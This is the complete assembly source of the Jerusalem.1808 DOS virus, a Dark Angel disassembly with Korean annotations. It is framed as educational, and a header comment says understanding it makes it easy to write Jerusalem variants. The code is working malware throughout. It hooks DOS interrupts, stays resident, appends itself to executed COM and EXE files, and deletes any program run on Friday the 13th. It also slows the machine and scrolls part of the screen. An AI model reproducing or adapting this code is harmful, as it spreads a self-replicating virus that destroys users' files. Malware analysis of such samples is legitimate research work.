;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     Jerusalem.1808.Standard                 \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Jerusalem.1808.Standard
; Author     : ?
; Origin     : Israel / Italia (?)
; Date       : 1998/02/05
; Disassmebly by Dark Angel
; Corean Edition : Nambeol
;
; Type : Memory resident  COM/EXE
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 말라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;  40Hex Number 13 Volume 4 Issue 1                                    File 008
;
;  이 바이러스의 작동 원리를 완벽하게 이해 한다면 쉽게 예루살렘 변형 바이러스를
;  제작 할 수 있을 것이다. 10 년도 지난 바이러스임을 기억하라 !
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

                .model  tiny
                .code
                org     0

; Jerusalem (Standard)
; Disassembly by Dark Angel of Phalcon/Skism
; 한글 주석 : Nambeol of CVL

viruslength     =       (endjerusalem - jerusalem) ; 바이러스 길이
jerusalem:
                jmp     enter_jerusalem
                db      'sU'                    ; 원래 sURiv 3 이었다고 한다.
marker          db      'MsDos'                 ; 바이러스 감염 여부 표시
COMdest         dw      0, 0                    ;
activate_flag   db      0                       ; 활동 상태
zero            dw      0                       ;
filesize        dw      3                       ; COM 파일 크기
oldint8         dw      0, 0                    ; 원래 인터럽트 8h 주소값
oldint21        dw      0, 0                    ; 원래 인터럽트 21h 주소값
oldint24        dw      0, 0                    ; 원래 인터럽트 24h 주소값
int8counter     dw      0                       ; 증상 카운터
tempheader      dw      0
EXEdest         dw      0,0                     ;
_initialSP      dw      0                       ;
_initialSS      dw      0                       ;
_headersize     dw      0                       ;
_filelengthlo   dw      0                       ;
_filelengthhi   dw      0                       ;
savePSP1        dw      0                       ; PSP 값
respara         dw      80h                     ; 실행을 위한 환경 데이터 영역

parmblock:
                dw      0 ; use current environment
                dw      80h
savePSP2        dw      0 ; pointer to command line
                dw      5Ch
savePSP3        dw      0 ; pointer to 1st FCB
                dw      6Ch
savePSP4        dw      0 ; pointer to 2nd FCB
saveSP          dw      0                       ; SP
saveSS          dw      0                       ; SS
initialCSIP     dw      0, 0                    ; CS,IP

oldintFF        dw      0                       ; 원래 Int FFh 내용
                db      0
COM_EXE_flag    db      0
header          dw      0Eh dup (0)
readbuffer      db      5 dup (0)               ; 감염여부를 확인 위한 버퍼
filehandle      dw      0                       ; 파일 핸들
fileattr        dw      0                       ; 파일 속성
filedate        dw      0                       ; 파일 날짜
filetime        dw      0                       ; 파일 시간
pagesize        dw      200h                    ; 512 (페이지 크기)
parasize        dw      10h                     ; paragraph->byte conversion
filelength      dw      0, 0                    ; 파일 길이
filenameptr     dw      0, 0                    ; 파일이름
command_com     db      'COMMAND.COM'           ; 감염 제외 파일
alloc_flag      dw      0                       ; 메모리 할당 여부 플래그
                db      0, 0, 0, 0

enter_jerusalem:
                cld
                mov     ah,0E0h                 ;
                int     21h                     ; 상주 여부 검사
                cmp     ah,0E0h
                jae     not_resident
                cmp     ah,3                    ; AH 가 3 이면 상주해있다.
                jb      not_resident

                mov     ah,0DDh                 ; COM 실행
                mov     di,100h                 ; DI= 100h
                mov     si,offset endjerusalem  ; SI= 원래 프로그램 시작점
                add     si,di                   ;     (파일길이 + 100h)
                mov     cx,cs:[di+filesize]     ; CX= 원래 프로그램 길이
                int     21h                     ; 재배치 실행
not_resident:
                mov     ax,cs                   ;
                add     ax,10h                  ; EXE 세그먼트 통일해서 점프
                mov     ss,ax                   ;
                mov     sp,700h                 ;
                push    ax
                mov     ax,offset relocate_entry
                push    ax
                retf

;
; 이 바이러스는 0 번지에서 실행되도록 제작되었다. 하지만, COM 파일은 100h 에서
; 실행되므로 세그먼트를 + 10h 해줘서 COM 파일도 0 번지에서 실행되는 것 처럼 만
; 둘 슈 있다.
; 0000:0100h 와 0010:0000h 는 절대주소에서 같음을 생각하기 바란다. 이해가 안되
; 면 디버거로 직접 실험해 보기 바란다.
;
relocate_entry:                                 ; EXE 파일 시작점
                cld
                push    es
                mov     cs:savePSP1,es          ;
                mov     cs:savePSP2,es          ; PSP 저장
                mov     cs:savePSP3,es          ;
                mov     cs:savePSP4,es          ;
                mov     ax,es
                add     ax,10h                  ;
                add     cs:initialCSIP+2,ax     ;
                add     cs:saveSS,ax
                mov     ah,0E0h                 ; 상주 여부 검사
                int     21h
                cmp     ah,0E0h
                jae     install_virus
                cmp     ah,3
                pop     es
                mov     ss,cs:saveSS            ; 원래 EXE 프로그램 실행
                mov     sp,cs:saveSP
                jmp     dword ptr cs:initialCSIP
install_virus:
                xor     ax,ax                   ;
                mov     es,ax                   ; 인터럽트 FFh 의 값에
                mov     ax,es:0FFh*4            ; rep movsw / retf 를 저장한다.
                mov     cs:oldintFF,ax          ;
                mov     al,es:0FFh*4+2          ;
                mov     byte ptr cs:oldintFF+2,al
                mov     word ptr es:0FFh*4,0A5F3h ; rep movsw
                mov     byte ptr es:0FFh*4+2,0CBh ; retf
                pop     ax                      ; COM 파일의 경우 그 메모리 그
                add     ax,10h                  ; 대로 재배치된다.
                mov     es,ax
                push    cs
                pop     ds
                mov     cx,viruslength          ; 바이러스 길이
                shr     cx,1                    ; 바이러스 길이 / 2
                xor     si,si
                mov     di,si
                push    es
                mov     ax,offset return_here
                push    ax
                db      0EAh                    ; jmp far ptr
                dw      03FCh, 0                ; JMP 0000:03FCh
return_here:
                mov     ax,cs                   ; 복사 끝난후 이쪽으로 점프한다.
                mov     ss,ax
                mov     sp,700h                 ; 스택 조정
                xor     ax,ax
                mov     ds,ax
                mov     ax,cs:oldintFF          ; Int FFh 복구
                mov     ds:0FFh*4,ax
                mov     al,byte ptr cs:oldintFF+2
                mov     ds:0FFh*4+2,al
                mov     bx,sp                   ; 메모리 할당
                mov     cl,4                    ; SP(700) / 2 ^ 4 = 패러그래피
                shr     bx,cl                   ; 단위
                add     bx,10h                  ; 10h 는 PSP 크기 이다. 256 byte
                mov     cs:respara,bx           ;
                mov     ah,4Ah                  ; 바이러스가 필요한 만큼만 메모
                mov     es,cs:savePSP1          ; 리를 줄인다.
                int     21h                     ;
;
; 메모리 할당 부분이 이해가 잘 안되면 관련 서적으로 공부를 더하기 바란다.
;
                mov     ax,3521h                ; 인터럽트 21h 주소 얻기
                int     21h                     ;
                mov     cs:oldint21,bx          ; 저장
                mov     word ptr cs:oldint21+2,es

                push    cs                      ; 바이러스가 가지는 인터럽트
                pop     ds                      ; 21h 핸들러로 바꾼다.
                mov     dx,offset int21
                mov     ax,2521h
                int     21h

                mov     es,savePSP1             ; PSP 저장
                mov     es,es:2Ch               ; 환경영역 세그먼트를 얻는다.
                xor     di,di                   ; PSP:002Ch 에 주소가 들어 있
                mov     cx,7FFFh                ; 다.
                xor     al,al                   ;
scan_environment:                               ; 환경영역 배치 역시 서적을
                repne   scasb                   ; 참고 하기 바란다.
                cmp     es:[di],al              ;
                loopnz  scan_environment        ;

                mov     dx,di                   ;
                add     dx,3                    ; 실행할 파일이름을 얻는다. 환
                mov     ax,4B00h                ; 경영역내에 있다.
                push    es
                pop     ds
                push    cs
                pop     es
                mov     bx,offset parmblock
                push    ds
                push    es
                push    ax
                push    bx
                push    cx
                push    dx
                mov     ah,2Ah                  ; 날짜 얻기
                int     21h

                mov     cs:activate_flag,0      ;
                cmp     cx,1987d                ; 1987 년에는 작동안한다.
                je      no_activate
                cmp     al,5                    ; 금요일인가 ?
                jne     set_int8
                cmp     dl,13d                  ; 13 일 인가 ?
                jne     set_int8
                inc     cs:activate_flag        ; 그러면 작동한다.
                jmp     short no_activate
                db      90h
set_int8:                                       ; Int 8h 를 저장한다.
                mov     ax,3508h                ;
                int     21h
                mov     cs:oldint8,bx
                mov     word ptr cs:oldint8+2,es

                push    cs
                pop     ds                      ;
                mov     int8counter,60*30*18    ; 시간 설정 (30분후)
                mov     ax,2508h                ;
                mov     dx,offset int8
                int     21h
no_activate:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds
                pushf
                call    dword ptr cs:oldint21   ; 원래 프로그램 실행
                push    ds
                pop     es
                mov     ah,49h                  ; 메모리 해제
                int     21h

                mov     ah,4Dh                  ; 에러값 얻기
                int     21h

                mov     ah,31h                  ; 원래 프로그램 실행후 기억장소
                mov     dx,600h                 ; 에 바이러스 상주함
                mov     cl,4
                shr     dx,cl
                add     dx,10h
                int     21h

int24:
                xor     al,al
                iret

int8:
                cmp     cs:int8counter,2        ; ********************
                jne     no_box                  ;       Int 8h
                push    ax                      ; ********************
                push    bx                      ;
                push    cx
                push    dx
                push    bp
                mov     ax,602h                 ; scroll up 2 lines
                mov     bh,87h                  ; (5,5) - (10,10)
                mov     cx,505h
                mov     dx,1010h
                int     10h                     ; 스크롤 효과

                pop     bp
                pop     dx
                pop     cx
                pop     bx
                pop     ax
no_box:
                dec     cs:int8counter
                jnz     exitint8
                mov     cs:int8counter,1
                push    ax
                push    cx
                push    si
                mov     cx,4001h                ; 지연시키기
                rep     lodsb
                pop     si
                pop     cx
                pop     ax
exitint8:
                jmp     dword ptr cs:oldint8    ; 원래 인터럽트 8 수행

int21:
                pushf
                cmp     ah,0E0h                 ; 상주 여부 검사 인가 ?
                jne     not_install
                mov     ax,300h                 ; 상주값 리턴
                popf
                iret
not_install:
                cmp     ah,0DDh                 ; COM 재배치
                je      restore_COM
                cmp     ah,0DEh                 ; EXE 재배치 (실제로는 사용안된
                je      restore_EXE             ; 다.)
                cmp     ax,4B00h                ; 실행인가 ?
                jne     exitint21
                jmp     execute
exitint21:
                popf
                jmp     dword ptr cs:oldint21
restore_COM:                                    ; 원래 COM 메모리에 재배치
                pop     ax                      ; pushf 했던 값
;
; 인터럽트가 호출되면 플래그,CS,IP  순으로 저장된다. 여기서 원래 인터럽트가 호
; 출된 곳을 알기 위해서는 CS 값만 알면된다.
;
                pop     ax                      ; IP 값
                mov     ax,100h                 ;
                mov     cs:COMdest,ax           ;
                pop     ax                      ; 프로그램 CS 얻기
                mov     word ptr cs:COMdest+2,ax
                rep     movsb                   ; 재배치
                popf                            ;
                mov     ax,cs:zero              ; clear AX
                jmp     dword ptr cs:COMdest    ; 원래 프로그램으로 점프
                                                ; CS:100h 로 점프한다.
restore_EXE:
                add     sp,6                    ; EXE 재배치
                popf                            ; 바이러스 제작자의 의도는
                mov     ax,cs                   ; EXE 파일도 앞부분에 바이러스
                mov     ss,ax                   ; 를 배치하려고 한것 같다. 하지
                mov     sp,offset endjerusalem  ; 만 이 루틴은 사용되지 않는다.
                push    es                      ; 이 루틴은 필요 없다.
                push    es
                xor     di,di
                push    cs
                pop     es
                mov     cx,10h
                mov     si,bx
                mov     di,offset tempheader
                rep     movsb
                mov     ax,ds
                mov     es,ax
                mul     cs:parasize             ; convert to bytes
                add     ax,cs:_headersize
                adc     dx,0
                div     cs:parasize             ; convert to paragraphs
                mov     ds,ax
                mov     si,dx
                mov     di,dx
                mov     bp,es
                mov     bx,cs:_filelengthhi
                or      bx,bx
                jz      no_move_code
move_code:
                mov     cx,8000h
                rep     movsw
                add     ax,1000h
                add     bp,1000h
                mov     ds,ax
                mov     es,bp
                dec     bx
                jnz     move_code
no_move_code:
                mov     cx,cs:_filelengthlo
                rep     movsb
                pop     ax
                push    ax
                add     ax,10h
                add     cs:_initialSS,ax
                add     word ptr cs:EXEdest+2,ax
                mov     ax,cs:tempheader
                pop     ds
                pop     es
                mov     ss,cs:_initialSS
                mov     sp,cs:_initialSP
                jmp     dword ptr cs:EXEdest

delete_file:
                xor     cx,cx                   ; 읽기/쓰기로 속성 변경
                mov     ax,4301h
                int     21h

                mov     ah,41h                  ; 파일 삭제
                int     21h

                mov     ax,4B00h                ; 프로그램 실행
                popf                            ; 당연히 파일이 없으므로 오류
                jmp     dword ptr cs:oldint21   ; 발생

execute:
                cmp     cs:activate_flag,1      ; 13일의 금요일 인가 ?
                je      delete_file
                mov     cs:filehandle,0FFFFh    ; 파일 핸들저장 (파일이 오픈되면
                                                ; 정상이면 파일 핸들이 저장된다)
                mov     cs:alloc_flag,0         ;
                mov     cs:filenameptr,dx       ; 파일 이름
                mov     word ptr cs:filenameptr+2,ds ; DS:DX
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                cld
                mov     di,dx
                xor     dl,dl
                cmp     byte ptr [di+1],':'     ; 드라이브 인가 ?
                jne     execute_nodrive
                mov     dl,[di]                 ; 드라이브 얻기
                and     dl,1Fh                  ; 문자를 숫자로 바꿈
execute_nodrive:
                mov     ah,36h                  ; 빈용량이 얼마인가 ?
                int     21h
                cmp     ax,0FFFFh               ; 에러인가 ?
                jne     check_drivespace
go_exit_execute:
                jmp     exit_execute
check_drivespace:
                mul     bx                      ; ax = clus/sec, bx=free clus
                mul     cx                      ; cx = bytes/sector
                or      dx,dx                   ; check if enough free space
                jnz     enough_space            ; 바이러스 길이 이상의 빈공간이
                cmp     ax,viruslength          ; 있는가 ?
                jb      go_exit_execute
enough_space:
                mov     dx,cs:filenameptr       ;
                push    ds
                pop     es
                xor     al,al                   ;
                mov     cx,41h
                repne   scasb
                mov     si,cs:filenameptr
uppercase_loop:
                mov     al,[si]                 ;
                or      al,al                   ; 파일 이름 끝인가 ?
                jz      uppercase_loop_done
                cmp     al,'a'                  ;
                jb      not_lower               ; 소문자를 대문자로 바꾼다.
                cmp     al,'z'                  ;
                ja      not_lower               ;
                sub     byte ptr [si],' '       ; - 20h (대문자와 소문자는
                                                ;        20h 의 차이가 있다.)
not_lower:
                inc     si
                jmp     short uppercase_loop
uppercase_loop_done:
                mov     cx,0Bh                  ; 파일 이름이 COMMAND.COM
                sub     si,cx                   ; 인가 ?
                mov     di,offset command_com
                push    cs
                pop     es
                mov     cx,0Bh
                repe    cmpsb
                jnz     not_command_com
                jmp     exit_execute
not_command_com:
                mov     ax,4300h                ; 속성 얻기
                int     21h
                jc      error1
                mov     cs:fileattr,cx
error1:
                jc      error2
                xor     al,al
                mov     cs:COM_EXE_flag,al      ;
                push    ds
                pop     es
                mov     di,dx
                mov     cx,41h
                repne   scasb                   ; COM 인지 검사한다. 이미 대문
                cmp     byte ptr [di-2],'M'     ; 자로 변환되었으므로 소문자 검
                je      EXEidentified           ; 사는 필요 없으며 단순히 확장
                cmp     byte ptr [di-2],'m'     ; 자 만으로 검사 하므로 문제가
                je      EXEidentified           ; 있다.
                inc     cs:COM_EXE_flag         ; EXE 파일이므로 증가
EXEidentified:
                mov     ax,3D00h                ; 파일 오픈
                int     21h
error2:
                jc      error3
                mov     cs:filehandle,ax
                mov     bx,ax
                mov     ax,4202h                ; 파일끝 - 5 로 이동
                mov     cx,0FFFFh
                mov     dx,0FFFBh
                int     21h
                jc      error2

                add     ax,5                    ; +5 해서 파일 길이 얻음
                mov     cs:filesize,ax
                mov     cx,5                    ; 5 바이트 읽기
                mov     dx,offset readbuffer
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     ah,3Fh
                int     21h

                mov     di,dx                   ; MsDos 인가 ?
                mov     si,offset marker        ; EXE 파일에 감염될때 MsDos 를
                repe    cmpsb                   ; 저장하지 않아 중복감염된다.
                jnz     not_infected            ;
                mov     ah,3Eh                  ; 파일 닫기
                int     21h

                jmp     exit_execute
not_infected:
                mov     ax,3524h                ; 인터럽트 24h 주소 얻기
                int     21h
                mov     oldint24,bx             ; 저장
                mov     word ptr oldint24+2,es

                mov     dx,offset int24         ; 새로운 Int 24h 로 바꿈
                mov     ax,2524h
                int     21h

                lds     dx,dword ptr filenameptr; 바이러스 이름 얻기
                xor     cx,cx                   ; 속성을 읽기/쓰기로 바꿈
                mov     ax,4301h
                int     21h
error3:
                jc      error4
                mov     bx,cs:filehandle
                mov     ah,3Eh                  ; 파일 닫기
                int     21h

                mov     cs:filehandle,0FFFFh    ; 에러시 FFFFh 가 들어있다.
                mov     ax,3D02h                ; 읽기/쓰기로 파일 오픈
                int     21h                     ; 정상 오픈이면 AX 에 파일핸들
                jc      error4                  ; 이 돌아온다.

                mov     cs:filehandle,ax        ; 핸들 저장
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     bx,filehandle
                mov     ax,5700h                ; 파일의 작성일/시간 얻기
                int     21h
                mov     filedate,dx             ; 저장
                mov     filetime,cx

                mov     ax,4200h                ; 파일 처음으로 이동
                xor     cx,cx
                mov     dx,cx
                int     21h
error4:
                jc      error5
                cmp     COM_EXE_flag,0          ; COM 인가 ?
                je      infect_com
                jmp     short infect_exe
                db      90h
infect_com:                                     ; COM 감염루틴
                mov     bx,1000h                ; 메모리 얻기 (64KB)
                mov     ah,48h
                int     21h
                jnc     allocation_fine

                mov     ah,3Eh                  ; 에러면 파일 닫기
                mov     bx,filehandle
                int     21h

                jmp     exit_execute
allocation_fine:
                inc     alloc_flag
                mov     es,ax                   ; 새 버퍼에 바이러스 복사
                xor     si,si
                mov     di,si
                mov     cx,viruslength
                rep     movsb
                mov     dx,di
                mov     cx,filesize             ; 원래 COM 크기 만큼 파일 읽어
                mov     bx,filehandle           ; 들이기
                push    es
                pop     ds
                mov     ah,3Fh                  ;
                int     21h
error5:
                jc      error6
                add     di,cx
                xor     cx,cx                   ; 파일 시작으로 이동
                mov     dx,cx
                mov     ax,4200h
                int     21h

                mov     si,offset marker        ; 파일 끝에 바이러스 식별자넣기
                mov     cx,5
                rep     movs byte ptr es:[di],cs:[si]
                mov     cx,di                   ;
                xor     dx,dx
                mov     ah,40h
                int     21h
error6:
                jc      error7
                jmp     error12
infect_exe:
                mov     cx,1Ch                  ; EXE 헤더 읽기
                mov     dx,offset header
                mov     ah,3Fh
                int     21h
error7:
                jc      error8
                mov     word ptr ds:header+12h,1984h ; ???
                mov     ax,ds:header+0eh; initial SS
                mov     ds:saveSS,ax
                mov     ax,ds:header+10h        ; initial SP
                mov     ds:saveSP,ax
                mov     ax,ds:header+14h
                mov     ds:initialCSIP,ax
                mov     ax,ds:header+16h
                mov     ds:initialCSIP+2,ax
                mov     ax,ds:header+4          ;
                cmp     word ptr ds:header+2,0  ;
                je      not_rounded
                dec     ax                      ;
not_rounded:
                mul     word ptr ds:pagesize
                add     ax,ds:header+2
                adc     dx,0                    ; 파일 크기 얻기
                add     ax,0Fh                  ; 16 의 배수로 만든다.
                adc     dx,0
                and     ax,0FFF0h               ;
                mov     ds:filelength,ax
                mov     ds:filelength+2,dx
                add     ax,viruslength          ; + 바이러스 길이
                adc     dx,0
error8:
                jc      error9
                div     word ptr ds:pagesize    ; 페이지 크기로 나눈다.
                or      dx,dx                   ; 나머지가 존재하나 ?
                jz      dont_round
                inc     ax
dont_round:
                mov     ds:header+4,ax          ; 새 해더 쓰기
                mov     ds:header+2,dx
                mov     ax,ds:filelength        ; convert filesize
                mov     dx,ds:filelength+2
                div     word ptr ds:parasize    ; to paragraphs
                sub     ax,ds:header+8          ; subtract header size
                mov     ds:header+16h,ax        ; insert as initial CS
                mov     word ptr ds:header+14h,offset relocate_entry
                mov     ds:header+0eh,ax        ; insert new stack segment
                mov     word ptr ds:header+10h,offset endjerusalem; & pointer

                xor     cx,cx                   ; 파일 시작으로 이동
                mov     dx,cx
                mov     ax,4200h
                int     21h
error9:
                jc      error10
                mov     cx,1Ch                  ; 바뀐 헤더 쓰기
                mov     dx,offset header
                mov     ah,40h
                int     21h
error10:
                jc      error11
                cmp     ax,cx
                jne     error12

                mov     dx,ds:filelength        ; 파일 끝으로 이동
                mov     cx,ds:filelength+2
                mov     ax,4200h
                int     21h
error11:
                jc      error12
                xor     dx,dx                   ; 바이러스 쓰기
                mov     cx,viruslength
                mov     ah,40h
                int     21h
error12:
                cmp     cs:alloc_flag,0         ; 메모리를 할당 했었나 ?
                je      no_free                 ;
                mov     ah,49h                  ; 메모리 해제
                int     21h
no_free:
                cmp     cs:filehandle,0FFFFh    ; 에러 인가 ? (파일이 오픈되지
                je      exit_execute            ; 않았다.)
                mov     bx,cs:filehandle        ; 파일작성 날짜/시간 얻기
                mov     dx,cs:filedate
                mov     cx,cs:filetime
                mov     ax,5701h
                int     21h

                mov     ah,3Eh                  ; 파일 닫기
                int     21h

                lds     dx,dword ptr cs:filenameptr
                mov     cx,cs:fileattr
                mov     ax,4301h                ; 속성 복구
                int     21h

                lds     dx,dword ptr cs:oldint24; Int 24h 복구
                mov     ax,2524h
                int     21h
exit_execute:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     dword ptr cs:oldint21
; slack space for stack here                    ; 스택
                org     710h
endjerusalem:
                nop
                int     20h                     ; 원래 프로그램 (3 바이트)
                db      'MsDos'                 ; 바이러스 감염표시

                end     jerusalem

